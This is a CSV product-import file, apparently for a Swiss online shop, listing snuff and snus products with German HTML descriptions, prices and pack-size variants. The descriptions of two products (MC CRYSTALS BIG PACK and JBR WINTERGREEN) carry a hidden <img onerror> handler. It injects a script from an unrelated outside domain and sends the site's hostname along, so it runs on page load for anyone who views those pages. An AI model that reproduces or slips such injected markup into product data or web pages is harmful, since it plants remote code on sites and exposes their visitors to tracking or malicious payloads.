Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
JBR RED,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>  <span>Der Neue JBR RED überzeugt min seinem neuen Geschmack. Leichter Kirsch Duft und eine kleine Spur Menthol.  Ein fruchtiger, zugleich aber auch kühlender Snuff kündigt sich an.</span></p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p>Art Nr: 1015</p>",JBR RED,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_fad69c33-524b-4dd6-8c90-91e3ae5ff9bc.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1015,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,20,,,,,,,,,,100.00,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
JBR YELLOW,"<p><span style=""color: #69b900;""> </span></p>
<div style=""text-align: left;"">
<span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span>
</div>
<div style=""text-align: left;""><span></span></div>
<p>Der Neue JBR YELLOW hat einen Menthol Geschmack. Mit seiner Neuheit überzeugt er<strong>!</strong>  </p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p>Art Nr: 1014</p>
<p> </p>
<p> </p>
<div style=""text-align: left;"" data-mce-fragment=""1"" data-mce-style=""text-align: left;""><br></div>",JBR YELLOW,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_61eb96ad-1e10-48b3-b5df-3bbd51606530.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1014,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,20,,,,,,,,,,138.00,100.00,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
Bernard Fichtennadel Schnupf 10g,"<h2 data-mce-fragment=""1"">F Bernard Original Schnupftabak in der 10 g Schachtel hat ein würzig-frisches Aroma<br>
</h2>
<p>Der rauchfreie F Bernard Original Schnupftabak in der praktischen Aufmachung mit Schiebeverschluss wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der mit Fichtennadeln aromatisierte F Bernard Original Schnupftabak ist eine gelungene Mischung aus hellen Tabaksorten. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der softe F Bernard Original Schnupftabak hat ein ausgeprägtes Fichtennadelaroma und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen F Bernard Original Schnupftabaks in einer mittelbraunen Farbe ist mühelos feucht und mittelfein. <br data-mce-fragment=""1""><br data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise F Bernard Original Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des F Bernard Original Schnupftabaks richtig auszukosten. Ob der F Bernard Original Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist unabhängig verschieden. Der F Bernard Original Snuff sollte zu jedem beliebigen Zeitpunkt umstandslos feucht sein. Sollte der F Bernard Original Schnupftabak nicht umstandslos aus der Aufmachung fließen, langt meist ein kurzes Aufklopfen zum Lockern. Der würzig-frische F Bernard Original Schnupftabak in der 10 g Packung passt komfortabel in die Tasche und ist fix griffbereit.<br></p>
<p> </p>
<p>ART: 1010</p>",Bernard Fichtennadel Schnupf 10g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/DesignohneTitel_14.png,,,,,5.75,,1,G,22,IN,3,3,3,,,,
,,1010,Unisex,Stück,1,,,,,,,,,,5.75,,1,G,22,IN,3,3,3,,,Snus-King,Bernard Fichtennadel Schnupf 10g
,,1010,Unisex,Stück,5,,,,,,,,,,28.75,,1,G,160,IN,3,3,3,,,Snus-King,Bernard Fichtennadel Schnupf 10g
,,1010,Unisex,Stück,10,,,,,,,,,,57.50,,1,G,220,IN,3,3,3,,,Snus-King,Bernard Fichtennadel Schnupf 10g
RED BULL ULTRA STRONG SCHNUPF 7G,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Red Bull - Ultra Strong Snuff 7g</p>
<p>Red Bull. ein ultra starker Snuff. Nur für hartgesottene Leute gemacht!</p>
<p> </p>
<p>  </p>
<p><span>Art Nr: 6001</span></p>",RED BULL ULTRA STRONG SCHNUPF 7G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/redbulsnuff.png,,,,,5.95,,1,G,16,IN,3,3,3,,,,
,,6001,Unisex,Stück,1,,,,,,,,,,5.95,,1,G,16,IN,3,3,3,,,Snus-King,RED BULL ULTRA STRONG SCHNUPF 7G
,,6001,Unisex,Stück,5,,,,,,,,,,29.75,,1,G,80,IN,3,3,3,,,Snus-King,RED BULL ULTRA STRONG SCHNUPF 7G
,,6001,Unisex,Stück,10,,,,,,,,,,59.50,,1,G,160,IN,3,3,3,,,Snus-King,RED BULL ULTRA STRONG SCHNUPF 7G
GAWITH HELVETIC SCHNUPF 7G,"<p style=""font-family: Arial, Helvetica, sans-serif; font-size: 16px; margin: 0px; padding: 0px; line-height: 1.5em;"" data-mce-fragment=""1"" data-mce-style=""font-family: Arial, Helvetica, sans-serif; font-size: 16px; margin: 0px; padding: 0px; line-height: 1.5em;"">Der beliebteste Schnupftabak in der Schweiz jetzt als Helvetic Edition. </p>
<p data-mce-fragment=""1""><span style=""font-family: Arial, Helvetica, sans-serif;"" data-mce-fragment=""1"" data-mce-style=""font-family: Arial, Helvetica, sans-serif;""><span style=""font-size: 16px;"" data-mce-fragment=""1"" data-mce-style=""font-size: 16px;"">Leichter Menthol Geschmack kombiniert mit fruchtigem Aprikosen Aroma.</span></span></p>
<br>
<p> </p>
<p><span>Art Nr: 6000</span></p>",GAWITH HELVETIC SCHNUPF 7G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/gaithhelevtic.png,,,,,4.80,,1,G,17,IN,3,3,3,,,,
,,6000,Unisex,Stück,1,,,,,,,,,,4.80,,1,G,17,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
,,6000,Unisex,Stück,5,,,,,,,,,,24.00,,1,G,34,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
,,6000,Unisex,Stück,10,,,,,,,,,,48.00,,1,G,170,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
McChrystal's Eidgenoss Snuff,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Ein „PRIIS“ auf die Schweizer Nationalmannschaft!</p>
<p>Garantiert der perfekte Begleiter für die bevorstehende Fussballweltmeisterschaft 2018 als auch die kommende Schwing-Saison.<br><br>Der EIDGENOSS Schnupftabak ist ein feiner, frischer Schnupftabak mit einem Hauch von reifer Aprikose, der einen angenehmen Abgang garantiert. Ein beliebter Schnupftabak für den täglichen Genuss.<br><br>Dieser Schnupftabak wurde gemeinsam von McChrystal‘s und Oettinger Davidoff entwickelt, weshalb er exklusiv und nur in der Schweiz erhältlich ist.</p>
<p> </p>
<p>  </p>
<p><span>Art Nr: 1009</span></p>",McChrystal's Eidgenoss Snuff,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/eidgenosssnuff.png,,,,,5.50,,1,G,22,IN,3,3,3,,,,
,,1009,Unisex,Stück,1,,,,,,,,,,5.50,,1,G,22,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
,,1009,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,16,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
,,1009,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,220,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
X-MAS SPECIAL SCHNUPF,"<p><span><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/1200px-Gelber_Punkt.svg_e48f35bc-0817-49e8-a775-b972dc940641_16x16.png?v=1583005834"" alt=""""> Nur solange der Vorrat reicht!</strong></span></p>
<p><span>X-MAS SPECIAL SCHNUPF 10G</span></p>
<p> </p>
<p> </p>
<p><span>Art Nr: 2000</span></p>",X-MAS SPECIAL SCHNUPF,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/xmasschnupf.png,,,,,7.50,6.80,1,G,26,IN,3,3,3,,,,
,,2000,Unisex,Stück,1,,,,,,,,,,7.50,6.80,1,G,26,IN,3,3,3,,,Snus-King,X-MAS SPECIAL SCHNUPF
JBR BLUE SCHNUPF 10G,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>JBR BLUE - Schnupf 10g</p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p> Art Nr: 1003</p>",JBR BLUE SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_2c34eb33-9eb7-4a3e-95d2-e7146887ddb6.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1003,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,20,,,,,,,,,,100.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
MC CRYSTALS ORIGINAL SCHNUPF Normal,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf Normal 4.4g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p>Art Nr: 1008</p>",MC CRYSTALS ORIGINAL SCHNUPF Normal,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ee212b2d-6c1f-4daf-9839-f7131a56758a.png,,,,,3.90,,1,G,12,IN,3,3,3,,,,
,,1008,Unisex,Stück,1,,,,,,,,,,3.90,,1,G,12,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,5,,,,,,,,,,19.50,,1,G,60,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,10,,,,,,,,,,39.00,,1,G,120,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
CRYSTALS ORIGINAL SCHNUPF Mittel,"<h2 data-mce-fragment=""1"">Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose hat ein frisch-fruchtig-süßes Aroma</h2>
<p data-mce-fragment=""1"">Der rauchfreie Mc Chrystal's Original &amp; Genuine Schnupftabak in der runden Dose mit Drehfunktion wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der hochwertige Mc Chrystal's Original &amp; Genuine Schnupftabak besteht aus einer feinen Tabakmischung und wird nach bewährter Familientradition verarbeitet. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der klassische Mc Chrystal's Original &amp; Genuine Schnupftabak verfügt über ein blumig-fruchtig-süßes Tabakaroma mit einer leichten Heunote und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen Mc Chrystal's Original &amp; Genuine Schnupftabaks in einer mittelbraunen Farbe ist trocken und puderfein. </p>
<p data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise Mc Chrystal's Original &amp; Genuine Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des Mc Chrystal's Original &amp; Genuine Schnupftabaks richtig auszukosten. Ob der Mc Chrystal's Original &amp; Genuine Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist individuell verschieden. Wenn der Mc Chrystal's Original &amp; Genuine Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein kurzes Aufklopfen zum Lockern. Der frisch-fruchtig-süße Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose passt bequem in die Tasche und ist schnell griffbereit.</p>
<br>
<p> </p>
<p> </p>
<p> Art Nr: 1007</p>",CRYSTALS ORIGINAL SCHNUPF Mittel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_344d5426-52d3-4704-ad5e-b79c86843ce5.png,,,,,6.00,,1,G,20,IN,3,3,3,,,,
,,1007,Unisex,Stück,1,,,,,,,,,,6.00,,1,G,20,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,5,,,,,,,,,,30.00,,1,G,100,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,10,,,,,,,,,,60.00,,1,G,200,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf BIG PACK 21g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p> Art Nr: 1002</p>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ea665772-22a0-422c-913c-69fcf3da2f75.png,,,,,9.90,,1,G,42,IN,3,3,3,,,,
,,1002,Unisex,Stück,1,,,,,,,,,,9.90,,1,G,42,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF BIG PACK
JBR WINTERGREEN SCHNUPF 10g,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>JBR Wintergreen - Schnupf 10g</p>
<p>Ein erfrischender Schnupftabak mit Wintergreen Aroma und feiner Spearmint Note.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p><span>Art Nr: 1001</span></p>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>",JBR WINTERGREEN SCHNUPF 10g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_651a7157-8ef3-4f6c-946e-c529a0241be5.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1001,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,20,,,,,,,,,,100.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
MC. CRYSTALS WHISKEY SHOT Schnupf,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Whiskey-Shot Schnupf</p>
<p>Klassischer Mc. Chrystal's geschmack mit einem Schuss Whikey Aroma.</p>
<p>Für jeden Whiskey Liebhaber ein idealer Schnupftabak.</p>
<p> </p>
<p> </p>
<p>Art Nr: 1000</p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC. CRYSTALS WHISKEY SHOT Schnupf,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/whiskeyshot.png,,,,,6.10,,1,G,20,IN,3,3,3,,,,
,,1000,Unisex,Stück,1,,,,,,,,,,6.10,,1,G,20,IN,3,3,3,,,Snus-King,MC. CRYSTALS WHISKEY SHOT Schnupf
,,1000,Unisex,Stück,5,,,,,,,,,,30.50,,1,G,100,IN,3,3,3,,,Snus-King,MC. CRYSTALS WHISKEY SHOT Schnupf
,,1000,Unisex,Stück,10,,,,,,,,,,61.00,,1,G,200,IN,3,3,3,,,Snus-King,MC. CRYSTALS WHISKEY SHOT Schnupf
GAWITH APRICOT SCHNUPF 10G,"<p data-mce-fragment=""1"">Der <strong data-mce-fragment=""1"">Gawith Original (vormals Apricot) Snuff</strong> ist <strong data-mce-fragment=""1"">herrlich fruchtig</strong> – <strong data-mce-fragment=""1"">immer frisch</strong>. Eine <b data-mce-fragment=""1"">Mischung</b> aus <b data-mce-fragment=""1"">speziell ausgesuchten Rohtabaken</b> mit einer <strong data-mce-fragment=""1"">feinen Aprikosen-Note</strong>. Der<strong data-mce-fragment=""1""> ideale Snuff </strong>für<strong data-mce-fragment=""1""> Liebhaber </strong>von<strong data-mce-fragment=""1""> fruchtigen Geschmacksrichtungen.</strong><br data-mce-fragment=""1""><strong data-mce-fragment=""1""></strong></p>
<p data-mce-fragment=""1"">International expandiert die <strong data-mce-fragment=""1"">Fa. Pöschl</strong> bereits seit den 1960er-Jahren. Ab den 90er-Jahren wurden ferner insgesamt neun Tochtergesellschaften in Osteuropa, sowie in Frankreich, Hongkong und der Schweiz gegründet. Hinzu kommen Beteiligungen an Tabakvertriebsgesellschaften in Italien, Großbritannien, Spanien sowie Belgien und Luxemburg. Unsere 14 Tochter- und Beteiligungsgesellschaften mit über 770 Mitarbeitern weltweit sowie Exportaktivitäten in ca. 100 Ländern machen uns zu einer global denkenden und handelnden Unternehmensgruppe. In Deutschland und in nahezu 100 Ländern der Welt vertreibt PÖSCHL TABAK heute weit über 6 Millionen kg Rauch- und Schnupftabak.<br data-mce-fragment=""1"">Auf der weiteren Internationalisierung des Unternehmens wird auch zukünftig ein Hauptaugenmerk liegen. Trotz des großen Erfolgs wahrt das Unternehmen seine Tradition und hält an seinen Prinzipien, wie unter anderem nur qualitativ hochwertige Produkte herzustellen und soziale und ethische Grundsätze zu wahren, fest.</p>
<p dir=""ltr"" align=""left""> </p>
<p><span>Art Nr: 1006</span></p>",GAWITH APRICOT SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/apricot.png,,,,,4.80,,1,G,23,IN,3,3,3,,,,
,,1006,Unisex,Stück,1,,,,,,,,,,4.80,,1,G,23,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
,,1006,Unisex,Stück,5,,,,,,,,,,24.00,,1,G,160,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
,,1006,Unisex,Stück,10,,,,,,,,,,48.00,,1,G,230,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
Siberia Box 500g,"<p><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> Ab Lager verfügbar</span><span mce-data-marked=""1"">.</span></strong></p>
<p>Siberia White Dry hat einen extrem hohen Nikotingehalt und eine Portion enthält mehr als fünfmal so viel Nikotin wie normalstarker Snus (8 mg/g). Wird Menschen, die Nikotin gegenüber empfindlich sind, weniger empfohlen. </p>
<p> <br></p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 500g                       Portionen / Dose: ~</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Mint</p>
<p>Nikotin (mg/g): 43.0</p>
<p> </p>
<p>  </p>
<p>106</p>",Siberia Box 500g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_7de6fd94-1f4e-458c-9134-707c8deee73c.jpg,,,,,125.00,,1,G,590,IN,3,3,3,,,,
,,106,Unisex,Stück,1,,,,,,,,,,125.00,,1,G,590,IN,3,3,3,,,Snus-King,Siberia Box 500g
,,106,Unisex,Stück,2,,,,,,,,,,250.00,,1,G,1000,IN,3,3,3,,,Snus-King,Siberia Box 500g
SIBERIA -80°C WHITE DRY,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p> SIBERIA -80 WHITE DRY</p>
<p>Siberia gehört zu den Top Favoriten auf dem Snusmarkt. Mit seinem Hohen Nikotin Anteil ist er sehr berühmt. Mit einem erfrischendem Geschmack bringt er dich auf ein neues Level.</p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen, Feuchthaltemittel E1520, Säureregulator E501</p>
<p>Tabakgewicht (g): 16                           <span> </span>Portionen / Dose: ~24</p>
<p>Versandgewicht (g): 34                      <span> </span>Geschmack: Tabak, Spearmint</p>
<p>Nikotin (mg/g): 43</p>
<p><br></p>
<p><br></p>
<p> <span>Art Nr: 100</span></p>",SIBERIA -80°C WHITE DRY,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/Siberiarot.png,,,,,5.90,,1,G,31,IN,3,3,3,,,,
,,100,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,31,IN,3,3,3,,,Snus-King,SIBERIA -80°C WHITE DRY
,,100,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,310,IN,3,3,3,,,Snus-King,SIBERIA -80°C WHITE DRY
